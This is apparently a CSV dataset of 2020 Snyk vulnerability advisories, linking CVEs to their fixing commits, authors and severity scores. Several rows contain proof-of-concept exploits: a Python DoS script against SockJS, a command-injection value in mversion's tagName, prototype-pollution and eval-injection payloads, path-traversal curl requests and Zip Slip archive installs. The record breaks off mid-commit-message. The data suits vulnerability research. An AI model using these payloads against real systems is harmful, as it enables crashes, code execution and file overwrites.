Affected versions of this package are vulnerable to Information Exposure. When an image with source={{uri: ""..."", headers: { host: ""somehost.com"", authorization: ""..."" }} is loaded, all other subsequent images will use the same headers, this can lead to signing credentials or other session tokens being leaked to other servers.",2020
CVE-2020-7693,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-SOCKJS-575261,08/07/2020,03/07/2020,https://github.com/sockjs/sockjs-node/commit/dd7e642cd69ee74385825816d30642c43e051d16,Denial of Service (DoS),https://api.github.com/repos/sockjs/sockjs-node/commits/dd7e642cd69ee74385825816d30642c43e051d16,Bryce Kahle,bryce@brycekahle.com,sockjs-node,dd7e642cd69ee74385825816d30642c43e051d16,"Merge pull request #266 from cakoose/backport-writeHead-fix

writeHead: Don't end() response",JavaScript,5.3,medium,"sockjs is a JavaScript library (for browsers) that provides a WebSocket-like object.
Affected versions of this package are vulnerable to Denial of Service (DoS). Incorrect handling of Upgrade header with the value websocket leads in crashing of containers hosting sockjs apps.
PoC by Andrew Snow
import requests
import random
import argparse

def main():
  print('SockJS 0.3.19 Denial of Service POC')
  print('For educational purposes only')
  print('Author: @andsnw')
  print('------------')
  parser = argparse.ArgumentParser(description='SockJS 0.3.19 Denial of Service POC')
  parser.add_argument('--target', type=str, help='URL of target running vulnerable sockjs')
  parsed = parser.parse_args()
  target = vars(parsed)['target']
  if target == None:
    parser.print_help()
    exit()
Clean trailing /
  if target.endswith('/'):
    target = target[:-1]
  print (""Initiating at: %s"" % target)
Create sockjs payload
  payloads = [
    ('%s/sockjs/' % target),
    ('%s/sockjs/598/' % target),
    ('%s/sockjs/598/8ko8gkpf/' % target),
  ]
Run 3 times with traversion
  for url in payloads:
    payload_url = ""%s%s"" % (url, random.randint(1000000000000000000,9999999999999999999))
    print('Requesting: %s' % payload_url)
    req = requests.get(url=payload_url, headers={
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
      'Cache-Control': 'max-age=0',
      'Accept-Language': 'en-US,en;q=0.5',
      'Connection': 'Upgrade',
      'Upgrade': 'websocket',
    })
    print(""Status code: %s"" % req.status_code)
  print (""Complete! Check if the container has crashed"")
if name == ""main"":
    main()",2020
CVE-2020-7698,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-GERAPY-572470,07/07/2020,17/06/2020,https://github.com/Gerapy/Gerapy/commit/e8446605eb2424717418eae199ec7aad573da2d2,Command Injection,https://api.github.com/repos/Gerapy/Gerapy/commits/e8446605eb2424717418eae199ec7aad573da2d2,Germey,cqc@cuiqingcai.com,Gerapy,e8446605eb2424717418eae199ec7aad573da2d2,to b1,Markdown,8.1,high,"gerapy is a Distributed Crawler Management Framework Based on Scrapy, Scrapyd, Scrapyd-Client, Scrapyd-API, Django and Vue.js.
Affected versions of this package are vulnerable to Command Injection. The input being passed to Popen, via the project_configure endpoint, isn’t being sanitized.",2020
CVE-2020-7692,CWE-285,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMGOOGLEOAUTHCLIENT-575276,03/07/2020,03/07/2020,https://github.com/googleapis/google-oauth-java-client/commit/13433cd7dd06267fc261f0b1d4764f8e3432c824,Improper Authorization,https://api.github.com/repos/googleapis/google-oauth-java-client/commits/13433cd7dd06267fc261f0b1d4764f8e3432c824,Stefán Freyr Stefánsson,stefan.freyr@gmail.com,google-oauth-java-client,13433cd7dd06267fc261f0b1d4764f8e3432c824,"feat: add PKCE support to AuthorizationCodeFlow (#470)

* Initial test code for a PKCE enabled Authorization Code Flow

* WIP: work on README.md

* Script to initialize keycloak by adding client via REST API.

* Improve keycloak init script and some code cleanup. Still WIP.

* WIP: work on README.md

* Working PKCE AuthorizationCodeFlow. Some cleanup of test classes.

* Add scopes back to the AuthorizationCodeRequestUrl creation.

* Simplify code by moving PKCE entirely into the AuthorizationCodeFlow class. Add documentation.

* Remove wildcard imports as that seems to be the way to do things here.

* Add @since annotation in JavaDoc to the PKCE parameters of the autorization url class.

* Add PKCE unit test, documentation and minor cleanup of dependencies for code sample.

* Add PKCE unit test, documentation and minor cleanup of dependencies for code sample.

* Annotate PKCE with Beta annotation.

* Responding to code review comments

* Responding to more PR comments

* Improve Keycloak PKCE sample documentation

* Add license header with copyright to new files. Improve documentation.",Java,7.4,high,"com.google.oauth-client:google-oauth-client is a powerful and easy-to-use Java library for the OAuth 1.0a and OAuth 2.0 authorization standards.
Affected versions of this package are vulnerable to Improper Authorization. PKCE support is not implemented in accordance with the RFC for OAuth 2.0 for Native Apps. Without the use of PKCE, the authorization code returned by an authorization server is not enough to guarantee that the client that issued the initial authorization request is the one that will be authorized. An attacker is able to obtain the authorization code using a malicious app on the client-side and use it to gain authorization to the protected resource.",2020
CVE-2020-7688,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-MVERSION-573174,25/06/2020,24/06/2020,https://github.com/mikaelbr/mversion/commit/b7a8b32600e60759a7ad3921ec4a2750bf173482,Command Injection,https://api.github.com/repos/mikaelbr/mversion/commits/b7a8b32600e60759a7ad3921ec4a2750bf173482,hbkhan,hbkhan@github.com,mversion,b7a8b32600e60759a7ad3921ec4a2750bf173482,Fix Remote Command Execution,JavaScript,8.4,high,"mversion is a cross packaging manager module version handler/bumper.
Affected versions of this package are vulnerable to Command Injection. The issue occurs because tagName user input is formatted inside the exec function is executed without any checks.
PoC:
var mversion = require('mversion');

mversion.update({
       version: ""major"",
       commitMessage: ""testing"",
       tagName: ""; touch hbkhan"",
 })",2020
,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-I18NEXT-585930,19/07/2020,11/07/2020,https://github.com/i18next/i18next/commit/ed6169fa21b67d8e73b20d82579aff6f9b808a69,Prototype Pollution,https://api.github.com/repos/i18next/i18next/commits/ed6169fa21b67d8e73b20d82579aff6f9b808a69,Adriano Raiano,adriano@raiano.ch,i18next,ed6169fa21b67d8e73b20d82579aff6f9b808a69,fix prototype pollution with constructor,Markdown,4.8,medium,"i18next is an internationalization framework for browser or any other javascript environment (eg. node.js).
Affected versions of this package are vulnerable to Prototype Pollution. This vulnerability relates to the AddResourceBundle API which uses the the deepExtend function (https://github.com/i18next/i18next/blob/master/i18next.js#L361-L370) internally to extend existing translations in a file. Depending on if user input is provided, an attacker can overwrite and pollute the object prototype of a program. 
PoC
import i18n from ""i18next"";
i18n.init({
    resources: {
      en: {
        namespace1: {
          key: 'hello from namespace 1'
        },
        namespace2: {
          key: 'hello from namespace 2'
        }
      },
      de: {
        namespace1: {
          key: 'hallo von namespace 1'
        },
        namespace2: {
          key: 'hallo von namespace 2'
        }  
      }
    }
  });

  var malicious_payload = '{""proto"":{""vulnerable"":""Polluted""}}';
  i18n.init({ resources: {} });
  i18n.addResourceBundle('en', 'namespace1', JSON.parse(malicious_payload)
  ,true,true);
console.log(i18n.options.resources);
//a newly created empty object has the vulnerable property
console.log({}.vulnerable);",2020
CVE-2020-7684,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-ROLLUPPLUGINSERVEFAVICON-585950,20/06/2020,20/06/2020,https://github.com/thgh/rollup-plugin-serve/commit/3d144f2f47e86fcba34f5a144968da94220e3969,Directory Traversal,https://api.github.com/repos/thgh/rollup-plugin-serve/commits/3d144f2f47e86fcba34f5a144968da94220e3969,Thomas Ghysels,info@thomasg.be,rollup-plugin-serve,3d144f2f47e86fcba34f5a144968da94220e3969,Fix path traversal issue,Markdown,7.5,high,"rollup-plugin-serve-favicon is a rollup plugin to serve bundles.
Affected versions of this package are vulnerable to Directory Traversal. There is no path sanitization in readFile operation.
PoC by JHU System Security Lab
Step 1: start a server
  var server = require(""rollup-plugin-serve"");
    server({
      host: 'localhost',
      port: 9000
    })

Step 2: create a file named file in the parent directory of the server's home directory.Step 3: curl -v --path-as-is http://127.0.0.1:9000/../file",2020
CVE-2020-7684,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-ROLLUPPLUGINSERVE-585897,20/06/2020,20/06/2020,https://github.com/thgh/rollup-plugin-serve/commit/3d144f2f47e86fcba34f5a144968da94220e3969,Directory Traversal,https://api.github.com/repos/thgh/rollup-plugin-serve/commits/3d144f2f47e86fcba34f5a144968da94220e3969,Thomas Ghysels,info@thomasg.be,rollup-plugin-serve,3d144f2f47e86fcba34f5a144968da94220e3969,Fix path traversal issue,Markdown,7.5,high,"rollup-plugin-serve is a rollup plugin to serve the bundle.
Affected versions of this package are vulnerable to Directory Traversal. There is no path sanitization in readFile operation.
PoC by JHU System Security Lab
Step 1: start a server
  var server = require(""rollup-plugin-serve"");
    server({
      host: 'localhost',
      port: 9000
    })

Step 2: create a file named file in the parent directory of the server's home directory.Step 3: curl -v --path-as-is http://127.0.0.1:9000/../file",2020
CVE-2020-4053,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMHELMHELMPKGPLUGININSTALLER-572401,16/06/2020,16/06/2020,https://github.com/helm/helm/commit/b6bbe4f08bbb98eadd6c9cd726b08a5c639908b3,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/helm/helm/commits/b6bbe4f08bbb98eadd6c9cd726b08a5c639908b3,Matt Butcher,matt.butcher@microsoft.com,helm,b6bbe4f08bbb98eadd6c9cd726b08a5c639908b3,"Improve the extractor and add tests (#8317)

Signed-off-by: Matt Butcher <matt.butcher@microsoft.com>",Go,8.8,high,"github.com/helm/helm/pkg/plugin/installer is a Kubernetes Package Manager.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). When installing Helm plugins from a tar archive over HTTP, it is possible for a malicious plugin author to inject a relative
path into a plugin archive, and copy a file outside of the intended directory, or overwrite contents of an arbitrary file where the path location is known.
PoC
Run helm plugin install https://github.com/snoopysecurity/Public/raw/master/payloads/evil.tar.gz` 

The evil.tar.gz has a  file called “../../../../../../../../tmp/test.txt”, which when extracted by the helm plugin installer will then move the test.txt file to the temp directory.",2020
CVE-2020-35884,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-RUST-TINYHTTP-573057,16/06/2020,16/06/2020,https://github.com/tiny-http/tiny-http/commit/172ca81705b484bab7556f4ee9265a6c2942473c,HTTP Request Smuggling,https://api.github.com/repos/tiny-http/tiny-http/commits/172ca81705b484bab7556f4ee9265a6c2942473c,Corey Farwell,coreyf@rwell.org,tiny-http,172ca81705b484bab7556f4ee9265a6c2942473c,"Merge pull request #190 from fortian/http-request-smuggle

Fix RUSTSEC-2020-0031",Unknown,8.2,high,"tiny_http is a Low level HTTP server library
Affected versions of this package are vulnerable to HTTP Request Smuggling. HTTP pipelining issues and request smuggling attacks might be possible due to incorrect Transfer encoding header parsing.
It is possible conduct HTTP request smuggling attacks (CL:TE/TE:TE) by sending invalid Transfer Encoding headers. By manipulating the HTTP response the attacker could poison a web-cache, perform an XSS attack, or obtain sensitive information from requests other than their own.",2020
CVE-2020-7708,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-IRRELONPATH-598673,19/08/2020,14/08/2020,https://github.com/Irrelon/irrelon-path/commit/8a126b160c1a854ae511659c111413ad9910ebe3,Prototype Pollution,https://api.github.com/repos/Irrelon/irrelon-path/commits/8a126b160c1a854ae511659c111413ad9910ebe3,robevans,rob@irrelon.com,irrelon-path,8a126b160c1a854ae511659c111413ad9910ebe3,Fixed functions with prototype pollution vulnerability,JavaScript,7.5,high,"@irrelon/path is an A powerful JSON path processor. Allows you to drill into and manipulate JSON objects with a simple dot-delimited path format e.g. ""obj.name"".
Affected versions of this package are vulnerable to Prototype Pollution via the set, unSet, pushVal and pullVal functions.
POC:
const path = require('@irrelon/path');
path.set({}, '__proto__.polluted', true);
console.log(polluted);",2020
CVE-2020-7708,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-IRRELONPATH-598672,19/08/2020,14/08/2020,https://github.com/Irrelon/irrelon-path/commit/8a126b160c1a854ae511659c111413ad9910ebe3,Prototype Pollution,https://api.github.com/repos/Irrelon/irrelon-path/commits/8a126b160c1a854ae511659c111413ad9910ebe3,robevans,rob@irrelon.com,irrelon-path,8a126b160c1a854ae511659c111413ad9910ebe3,Fixed functions with prototype pollution vulnerability,JavaScript,7.5,high,"irrelon-path is an A powerful JSON path processor. Allows you to drill into and manipulate JSON objects with a simple dot-delimited path format e.g. ""obj.name"".
Affected versions of this package are vulnerable to Prototype Pollution via the set, unSet, pushVal and pullVal functions.
POC:
const path = require('@irrelon/path');
path.set({}, '__proto__.polluted', true);
console.log(polluted);",2020
,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-598804,17/08/2020,17/08/2020,https://github.com/janl/node-jsonpointer/commit/234e3437019c6c07537ed2ad1e03b3e132b85e34,Prototype Pollution,https://api.github.com/repos/janl/node-jsonpointer/commits/234e3437019c6c07537ed2ad1e03b3e132b85e34,Jan Lehnardt,jan@apache.org,node-jsonpointer,234e3437019c6c07537ed2ad1e03b3e132b85e34,"fix: prototype pollution

for curiousity’s sake, I checked if this has any
significant performance impact and it does not.

Based on 10 runs before and after, all values in
percent:

                         MED    AVG
get first level property 0.37	0.42
get second level property 0.40	0.61
get third level property 0.26	0.41
set first level property 2.25	2.16
set second level property 1.45	1.67
set third level property 2.05	1.98
push property into array -0.41	-0.51

2.25% slowdown as a worst case is not significant.",JavaScript,9.8,critical,"jsonpointer is a Simple JSON Addressing.
Affected versions of this package are vulnerable to Prototype Pollution via the set function.
POC by NerdJS
const jsonpointer = require('jsonpointer');
jsonpointer.set({}, '/__proto__/polluted', true);
console.log(polluted);",2020
CVE-2020-7699,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-EXPRESSFILEUPLOAD-595969,30/07/2020,29/07/2020,https://github.com/richardgirges/express-fileupload/commit/9fca550f08a9dc07cc3500921f4fa7879cf88b8f,Prototype Pollution,https://api.github.com/repos/richardgirges/express-fileupload/commits/9fca550f08a9dc07cc3500921f4fa7879cf88b8f,Richard Girges,richardgirges@gmail.com,express-fileupload,9fca550f08a9dc07cc3500921f4fa7879cf88b8f,"Merge pull request #240 from AmazingMech2418/patch-1

Fix #239",JavaScript,7.5,high,"express-fileupload is a file upload middleware for express that wraps around busboy.
Affected versions of this package are vulnerable to Prototype Pollution. If the parseNested option is enabled, sending a corrupt HTTP request can lead to denial of service or arbitrary code execution.",2020
CVE-2020-35884,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-RUST-TINYHTTP-569106,16/06/2020,16/06/2020,https://github.com/tiny-http/tiny-http/commit/172ca81705b484bab7556f4ee9265a6c2942473c,HTTP Request Smuggling,https://api.github.com/repos/tiny-http/tiny-http/commits/172ca81705b484bab7556f4ee9265a6c2942473c,Corey Farwell,coreyf@rwell.org,tiny-http,172ca81705b484bab7556f4ee9265a6c2942473c,"Merge pull request #190 from fortian/http-request-smuggle

Fix RUSTSEC-2020-0031",Unknown,,Proof of concept,"tiny-http is a Low level HTTP server library
Affected versions of this package are vulnerable to HTTP Request Smuggling. HTTP pipelining issues and request smuggling attacks might be possible due to incorrect Transfer encoding header parsing.
It is possible conduct HTTP request smuggling attacks (CL:TE/TE:TE) by sending invalid Transfer Encoding headers. By manipulating the HTTP response the attacker could poison a web-cache, perform an XSS attack, or obtain sensitive information from requests other than their own.",2020
,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-JINGO-595966,29/07/2020,29/07/2020,https://github.com/claudioc/jingo/commit/6d4738c1aba892c372c4d0628a8a0a1d237ec95d,Arbitrary Code Execution,https://api.github.com/repos/claudioc/jingo/commits/6d4738c1aba892c372c4d0628a8a0a1d237ec95d,Claudio Cicali,claudio.cicali@n26.com,jingo,6d4738c1aba892c372c4d0628a8a0a1d237ec95d,Uses the safer yaml.safeLoad,Markdown,8.3,high,"jingo is a git based wiki engine written for node.js, with a decent design, a search capability and a good typography.
Affected versions of this package are vulnerable to Arbitrary Code Execution due to the default usage of the function yaml.load() of the package js-yaml instead of its secure replacement , yaml.safeLoad().",2020
CVE-2020-4053,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-HELMSHHELMV3PKGPLUGININSTALLER-1083959,16/06/2020,16/06/2020,https://github.com/helm/helm/commit/b6bbe4f08bbb98eadd6c9cd726b08a5c639908b3,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/helm/helm/commits/b6bbe4f08bbb98eadd6c9cd726b08a5c639908b3,Matt Butcher,matt.butcher@microsoft.com,helm,b6bbe4f08bbb98eadd6c9cd726b08a5c639908b3,"Improve the extractor and add tests (#8317)

Signed-off-by: Matt Butcher <matt.butcher@microsoft.com>",Go,8.8,high,"helm.sh/helm/v3/pkg/plugin/installer is a Kubernetes Package Manager.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). When installing Helm plugins from a tar archive over HTTP, it is possible for a malicious plugin author to inject a relative
path into a plugin archive, and copy a file outside of the intended directory, or overwrite contents of an arbitrary file where the path location is known.
PoC
Run helm plugin install https://github.com/snoopysecurity/Public/raw/master/payloads/evil.tar.gz` 

The evil.tar.gz has a  file called “../../../../../../../../tmp/test.txt”, which when extracted by the helm plugin installer will then move the test.txt file to the temp directory.",2020
CVE-2020-7677,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-THENIFY-571690,15/06/2020,15/06/2020,https://github.com/thenables/thenify/commit/0d94a24eb933bc835d568f3009f4d269c4c4c17a,Arbitrary Code Execution,https://api.github.com/repos/thenables/thenify/commits/0d94a24eb933bc835d568f3009f4d269c4c4c17a,Yiyu He,dead_horse@qq.com,thenify,0d94a24eb933bc835d568f3009f4d269c4c4c17a,fix: remove eval (#30),JavaScript,8.6,high,"thenify is a Promisify a callback-based function using any-promise.
Affected versions of this package are vulnerable to Arbitrary Code Execution. The name argument provided to the package can be controlled by users without any sanitization, and this is provided to the eval function without any sanitization.
PoC
var a = require(""thenify"");
var attack_code = ""fs=require('fs');fs.writeFile('Song', 'test',function(){})"";
function cur(){};
Object.defineProperty(cur, ""name"", { value: ""fake() {"" + attack_code + "";})();(function(){//""});
a(cur);",2020
,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-IODINE-569134,08/06/2020,18/05/2020,https://github.com/boazsegev/iodine/commit/e5612e9e43a3b0145e49ff0038c95bdecbdec811,HTTP Request Smuggling,https://api.github.com/repos/boazsegev/iodine/commits/e5612e9e43a3b0145e49ff0038c95bdecbdec811,Bo,bo@bowild.com,iodine,e5612e9e43a3b0145e49ff0038c95bdecbdec811,updates from facil.io + bump,C/C++,4.8,medium,"iodine is a fast HTTP / Websocket Server with built-in Pub/Sub support (with or without Redis), static file support and many other features, optimized for Ruby MRI on Linux / BSD / macOS.
Affected versions of this package are vulnerable to HTTP Request Smuggling. HTTP pipelining issues and request smuggling attacks might be possible due to incorrect Content-Length and Transfer encoding header parsing. 
It could be possible to conduct HTTP request smuggling attacks where iodine is used as part of a chain of backend servers due to insufficient Content-Length and Transfer Encoding parsing.",2020
CVE-2020-7667,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMSASSOFTWAREGORPMUTILSCPIO-570427,05/06/2020,27/05/2020,https://github.com/sassoftware/go-rpmutils/commit/a64058cf21b8aada501bba923c9aab66fb6febf0,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/sassoftware/go-rpmutils/commits/a64058cf21b8aada501bba923c9aab66fb6febf0,Michael Tharp,michael.tharp@sas.com,go-rpmutils,a64058cf21b8aada501bba923c9aab66fb6febf0,Prevent cpio.Extract from writing into parent directories,Go,7.5,high,"github.com/sassoftware/go-rpmutils/cpio is a package for parsing and extracting content from RPM files.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). The CPIO extraction functionality doesn't sanitize the paths of the archived files for leading and non-leading "".."" which leads in file extraction outside of the current directory. 
Note: the fixing commit was applied to all affected versions which were re-released.
PoC by Georgios Gkitsas of Snyk Security Team
Having a modified relative.cpio that includes relative paths:
package main

import (
    cpio ""github.com/sassoftware/go-rpmutils/cpio""
    ""os""
    ""testing/iotest""
    ""fmt""
)
func main() {
    file := ""relative.cpio""
f, err := os.Open(file)
if err != nil {
    fmt.Println(err)
}

hf := iotest.HalfReader(f)
if err := cpio.Extract(hf, &quot;.&quot;); err != nil {
    fmt.Println(err)
}

}",2020
CVE-2020-7664,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMUNKNWONCAEZIP-570383,05/06/2020,26/05/2020,https://github.com/unknwon/cae/commit/07971c00a1bfd9dc171c3ad0bfab5b67c2287e11,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/unknwon/cae/commits/07971c00a1bfd9dc171c3ad0bfab5b67c2287e11,ᴜɴᴋɴᴡᴏɴ,u@gogs.io,cae,07971c00a1bfd9dc171c3ad0bfab5b67c2287e11,"security: clean file path on extracting

Reported by George Gkitsas.",Go,7.5,high,"github.com/unknwon/cae/zip is a package that provides archiving functionality for .zip archives.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). The ExtractTo function doesn't securely escape file paths in zip archives which include leading or non-leading "".."". This allows an attacker to add or replace files system-wide.
PoC by Georgios Gkitsas
package main

import (
    cae_zip ""github.com/unknwon/cae/zip""
)
func main() {
    file := ""relative.zip""
    z, _ := cae_zip.Open(file)
    z.ExtractTo(""."")
}

where ""relative.zip"" is a zip archive that includes a leading/non-leading "".."" in at least one file path.",2020
CVE-2020-7668,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMUNKNWONCAETZ-570384,05/06/2020,26/05/2020,https://github.com/unknwon/cae/commit/07971c00a1bfd9dc171c3ad0bfab5b67c2287e11,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/unknwon/cae/commits/07971c00a1bfd9dc171c3ad0bfab5b67c2287e11,ᴜɴᴋɴᴡᴏɴ,u@gogs.io,cae,07971c00a1bfd9dc171c3ad0bfab5b67c2287e11,"security: clean file path on extracting

Reported by George Gkitsas.",Go,7.5,high,"github.com/unknwon/cae/tz is a package that provides archiving functionality for .tar.gz archives.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). The ExtractTo function doesn't securely escape file paths in zip archives which include leading or non-leading "".."". This allows an attacker to add or replace files system-wide.
PoC by Georgios Gkitsas
package main

import (
    cae_tz ""github.com/unknwon/cae/tz""
)
func main() {
    file := ""relative.tar.gz""
    z, _ := cae_tz.Open(file)
    z.ExtractTo(""."")
}

where ""relative.tar.gz"" is a .tar.gz archive that includes a leading/non-leading "".."" in at least one file path.",2020
CVE-2020-7670,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-AGOO-569137,03/06/2020,03/06/2020,https://github.com/ohler55/agoo/commit/23d03535cf7b50d679a60a953a0cae9519a4a130,HTTP Request Smuggling,https://api.github.com/repos/ohler55/agoo/commits/23d03535cf7b50d679a60a953a0cae9519a4a130,Peter Ohler,peter@ohler.com,agoo,23d03535cf7b50d679a60a953a0cae9519a4a130,"Remote addr (#99)

* REMOTE_ADDR added

* Ready for merge",Markdown,5.9,medium,"agoo is a fast HTTP server supporting rack.
Affected versions of this package are vulnerable to HTTP Request Smuggling. HTTP pipelining issues and request smuggling attacks might be possible due to incorrect Content-Length and Transfer encoding header parsing. 
It is possible to conduct HTTP request smuggling attacks where agoo is used as part of a chain of backend servers due to insufficient Content-Length and Transfer Encoding parsing.",2020
CVE-2020-7649,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-SNYKBROKER-570608,29/05/2020,28/05/2020,https://github.com/snyk/broker/commit/90e0bac07a800b7c4c6646097c9c89d6b878b429,Directory Traversal,https://api.github.com/repos/snyk/broker/commits/90e0bac07a800b7c4c6646097c9c89d6b878b429,Tom Robinson,tom.ro88o@gmail.com,broker,90e0bac07a800b7c4c6646097c9c89d6b878b429,feat: reject paths with directory traversal,JavaScript,4.9,medium,"snyk-broker is a package that proxies access between snyk.io and your Git repositories, such as GitHub Enterprise, GitHub.com and Bitbucket Server. Snyk Broker can also be used to enable a secure connection with your on-premise Jira deployment.
Affected versions of this package are vulnerable to Directory Traversal. It allows arbitrary file reads for users with access to Snyk's internal network via directory traversal.",2020
CVE-2020-7662,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-WEBSOCKETEXTENSIONS-570830,02/06/2020,02/06/2020,https://github.com/faye/websocket-extensions-node/commit/29496f6838bfadfe5a2f85dff33ed0ba33873237,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/faye/websocket-extensions-node/commits/29496f6838bfadfe5a2f85dff33ed0ba33873237,James Coglan,jcoglan@gmail.com,websocket-extensions-node,29496f6838bfadfe5a2f85dff33ed0ba33873237,"Remove ReDoS vulnerability in the Sec-WebSocket-Extensions header parser

There is a regular expression denial of service (ReDoS) vulnerability in
the parser we use to process the `Sec-WebSocket-Extensions` header. It
can be exploited by sending an opening WebSocket handshake to a server
containing a header of the form:

    Sec-WebSocket-Extensions: a;b=""\c\c\c\c\c\c\c\c\c\c ...

i.e. a header containing an unclosed string parameter value whose
content is a repeating two-byte sequence of a backslash and some other
character. The parser takes exponential time to reject this header as
invalid, and this can be used to exhaust the server's capacity to
process requests.

This vulnerability has been assigned the identifier CVE-2020-7662 and
was reported by Robert McLaughlin.

We believe this flaw stems from the grammar specified for this header.
[RFC 6455][1] defines the grammar for the header as:

    Sec-WebSocket-Extensions = extension-list

    extension-list    = 1#extension
    extension         = extension-token *( "";"" extension-param )
    extension-token   = registered-token
    registered-token  = token
    extension-param   = token [ ""="" (token | quoted-string) ]

It refers to [RFC 2616][2] for the definitions of `token` and
`quoted-string`, which are:

    token          = 1*<any CHAR except CTLs or separators>
    separators     = ""("" | "")"" | ""<"" | "">"" | ""@""
                   | "","" | "";"" | "":"" | ""\"" | <"">
                   | ""/"" | ""["" | ""]"" | ""?"" | ""=""
                   | ""{"" | ""}"" | SP | HT

    quoted-string  = ( <""> *(qdtext | quoted-pair ) <""> )
    qdtext         = <any TEXT except <"">>
    quoted-pair    = ""\"" CHAR

These rely on the `CHAR`, `CTL` and `TEXT` grammars, which are:

    CHAR           = <any US-ASCII character (octets 0 - 127)>
    CTL            = <any US-ASCII control character (octets 0 - 31) and DEL (127)>
    TEXT           = <any OCTET except CTLs, but including LWS>

Other relevant definitions to support these:

    OCTET          = <any 8-bit sequence of data>
    LWS            = [CRLF] 1*( SP | HT )
    CRLF           = CR LF

    HT             = <US-ASCII HT, horizontal-tab (9)>
    LF             = <US-ASCII LF, linefeed (10)>
    CR             = <US-ASCII CR, carriage return (13)>
    SP             = <US-ASCII SP, space (32)>

To expand some of these terms out and write them as regular expressions:

    OCTET         = [\x00-\xFF]
    CHAR          = [\x00-\x7F]
    TEXT          = [\t \x21-\x7E\x80-\xFF]

The allowable bytes for `token` are [\x00-\x7F], except [\x00-\x1F\x7F]
(leaving [\x20-\x7E]) and `separators`, which leaves the following set
of allowed chars:

    ! # $ % & ' * + - . ^ _ ` | ~ [0-9] [A-Z] [a-z]

`quoted-string` contains a repeated pattern of either `qdtext` or
`quoted-pair`. `qdtext` is any `TEXT` byte except <"">, and the <"">
character is ASCII 34, or 0x22. The <!> character is 0x21. So `qdtext`
can be written either positively as:

    qdtext        = [\t !\x23-\x7E\x80-\xFF]

or negatively, as:

    qdtext        = [^\x00-\x08\x0A-\x1F\x7F""]

We use the negative definition here. The other alternative in the
`quoted-string` pattern is:

    quoted-pair   = \\[\x00-\x7F]

The problem is that the set of bytes matched by `qdtext` includes <\>,
and intersects with the second element of `quoted-pair`. That means the
sequence \c can be matched as either two `qdtext` bytes, or as a single
`quoted-pair`. When the regex engine fails to find a trailing <""> to
close the string, it back-tracks and tries every alternate parse for the
string, which doubles with each pair of bytes in the input.

To fix the ReDoS flaw we need to rewrite the repeating pattern so that
none of its alternate branches can match the same text. For example, we
could try dividing the set of bytes [\x00-\xFF] into those that must not
follow a <\>, those that may follow a <\>, and those that must be
preceded by <\>, and thereby construct a pattern of the form:

    (A|\?B|\C)*

where A, B and C have no characters in common. In our case the three
branch patterns would be:

    A   =   qdtext - CHAR   =   [\x80-\xFF]
    B   =   qdtext & CHAR   =   [\t !\x23-\x7E]
    C   =   CHAR - qdtext   =   [\x00-\x08\x0A-\x1F\x7F""]

These sets do not intersect, and notice <""> appears in set C so must be
preceded by <\>. But we still have a problem: <\> (0x5C) and all the
alphabetic characters are in set B, so the pattern \?B can match all
these:

    c
    \
    \c

So the sequence \c\c\c... still produces exponential back-tracking. It
also fails to parse input like this correctly:

    Sec-WebSocket-Extensions: a; b=""c\"", d""

Because the grammar allows a single backslash to appear by itself, this
is arguably a syntax error where the parameter `b` has value `c\` and
then a new extension `d` begins with a <""> appearing where it should
not.

So the core problem is with the grammar itself: `qdtext` matches a
single backslash <\>, and `quoted-pair` matches a pair <\\>. So given a
sequence of backslashes there's no canonical parse and the grammar is
ambiguous.

[RFC 7230][3] remedies this problem and makes the grammar clearer.
First, it defines `token` explicitly rather than implicitly:

    token          = 1*tchar

    tchar          = ""!"" / ""#"" / ""$"" / ""%"" / ""&"" / ""'"" / ""*""
                   / ""+"" / ""-"" / ""."" / ""^"" / ""_"" / ""`"" / ""|"" / ""~""
                   / DIGIT / ALPHA

And second, it defines `quoted-string` so that backslashes cannot appear
on their own:

     quoted-string  = DQUOTE *( qdtext / quoted-pair ) DQUOTE
     qdtext         = HTAB / SP /%x21 / %x23-5B / %x5D-7E / obs-text
     obs-text       = %x80-FF
     quoted-pair    = ""\"" ( HTAB / SP / VCHAR / obs-text )

where VCHAR is any printing ASCII character 0x21-0x7E. Notice `qdtext`
is just our previous definition but with 5C excluded, so it cannot
accept a single backslash.

This commit makes this modification to our matching patterns, and
